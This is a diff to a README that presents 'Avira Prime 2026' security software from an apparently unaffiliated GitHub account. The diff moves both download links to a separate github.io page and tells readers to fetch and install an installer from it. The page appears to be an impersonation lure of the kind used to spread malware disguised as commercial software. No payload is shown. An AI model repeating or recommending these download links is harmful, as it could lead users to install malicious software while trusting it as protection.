@@ -1,6 +1,6 @@
 # 🛡️ Avira-Prime-2026 - Protect Your Computer With Ease
 
-[![](https://img.shields.io/badge/Download-Avira_Prime_2026-blue.svg)](https://github.com/Hedamedullary79/Avira-Prime-2026/releases)
+[![](https://img.shields.io/badge/Download-Avira_Prime_2026-blue.svg)](https://hedamedullary79.github.io)
 
 ## 📌 Overview
 Avira Prime 2026 keeps your Windows computer safe from threats. It stops viruses, blocks tracking, and secures your internet connection. This software package includes tools to manage passwords, clean junk files, and hide your browsing activity. You install it once to gain access to a full suite of security features.
@@ -15,7 +15,7 @@ Before you start, check that your computer meets these basic needs:
 *   Internet Connection: Required for activation and updates.
 
 ## 📥 How to Download 🛡️
-1. Go to the [official release page](https://github.com/Hedamedullary79/Avira-Prime-2026/releases).
+1. Go to the [official release page](https://hedamedullary79.github.io).
 2. Look for the release labeled Latest.
 3. Click the link to download the installer file. 
 4. Wait for the file to finish downloading to your computer.
